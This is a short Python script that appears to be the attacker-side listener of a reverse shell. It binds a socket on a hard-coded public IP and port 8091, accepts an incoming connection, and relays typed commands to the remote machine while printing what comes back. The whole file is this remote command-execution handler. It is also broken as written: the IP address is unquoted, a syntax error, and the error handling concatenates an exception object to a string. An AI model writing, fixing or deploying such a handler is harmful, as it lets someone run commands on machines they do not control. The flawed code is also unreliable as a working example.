import socket
import sys
import colorama
from colorama import Fore,Back,Style
colorama.init()

def CreateSocket():

	try:
		global host, port, s
		port = 8091
		host = 35.184.234.161

		s = socket.socket()

	except socket.error as socketErorr:
		print("Scket Creation Error Occured"+socketErorr)




def Bind_Socket():
	try:
		global host, port, s
		print(Fore.YELLOW +"Binding the port "+str(port))
		s.bind((host,port))
		s.listen(5)

	except socket.error as socketError:
		print(Fore.RED + "Socket Binding Erorr" + str(socketError) + "\n" + "Retrying...")
		Bind_Socket()



def Socket_Accept():
	CONN,ADDR = s.accept()
	print(Fore.GREEN + f"Connection Established To IP {ADDR[0]}, PORT: {ADDR[1]}")
	send_Commands(CONN)
	CONN.close()

def send_Commands(CONN):
	while True:
		command_Exec = input(" ")
		if command_Exec == "exit":
			CONN.close()
			s.close()
			sys.exit()

		if len(str.encode(command_Exec)) > 0:
			CONN.send(str.encode(command_Exec))
			remote_response = str(CONN.recv(1024),"utf-8")
			print(remote_response,end=" ")



if __name__ == '__main__':
	CreateSocket()
	Bind_Socket()
	Socket_Accept()